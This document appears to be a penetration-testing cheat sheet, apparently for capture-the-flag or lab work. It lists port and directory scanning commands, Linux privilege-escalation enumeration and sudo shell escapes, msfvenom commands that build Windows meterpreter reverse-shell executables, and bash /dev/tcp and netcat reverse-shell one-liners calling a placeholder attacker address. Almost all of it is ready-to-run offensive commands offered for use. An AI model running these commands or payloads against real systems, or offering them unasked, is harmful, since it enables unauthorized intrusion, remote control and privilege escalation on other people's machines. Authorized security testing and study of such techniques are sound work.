[GTFOBins](https://gtfobins.github.io/), [LinSmartEnum](https://github.com/diego-treitos/linux-smart-enumeration), [LinEnum](https://github.com/rebootuser/LinEnum), [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

----
## scan ports
```bash
# nmap scan allports, service/version info, script scan
nmap -T4 -sC -sV -p- --min-rate=1000 -oN <FILE> <IP> -Pn

# masscan all tcp ports
massscan -p1-65535 <IP>
```
## file/directory scan

```bash
# gobsuter scan php files
gobuster dir -u <IP> -w /SecLists/Discovery/Web-Content/raft-medium-words.txt -t 30 -x php

# gobuster scan directory
gobuster dir -u <IP> -w /usr/share/wordlists/dirb/big.txt -t 30
gobuster dir -u <IP> -w /SecLists//Discovery/Web-Content/raft-medium-words.txt -t 30
```

----
## potential priv-esc
```bash
# list allowed sudo commands
sudo -l

# list files capabilities
getcap -r / 2>/dev/null

# find suid / sgid files
find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
find / -type f -perm -4000 -exec ls -l {} \; 2> /dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls  -l {} \; 2> /dev/null
```

## windows msfvenom payloads
```bash
# windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o payload.exe

# windows reverse shell uses exploit/multi/handler as listener
msfvenom -p windows/shell/reverse_tcp --platform=win --arch=x86 LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe
```

## reverse shell
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'

nc -e /bin/bash <IP> <PORT>
```

## etc
```bash
# ssh with public_key
ssh <user>@<server> -i ~/.ssh/id_rsa

# tty shell
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo
fg
enter

# check shared objects 
strace <file> 2>&1

# if sudo su not allowed
sudo -s
sudo -i
sudo /bin/bash
sudo password

# metasploit migrate to diff process
migrate <process_id>
```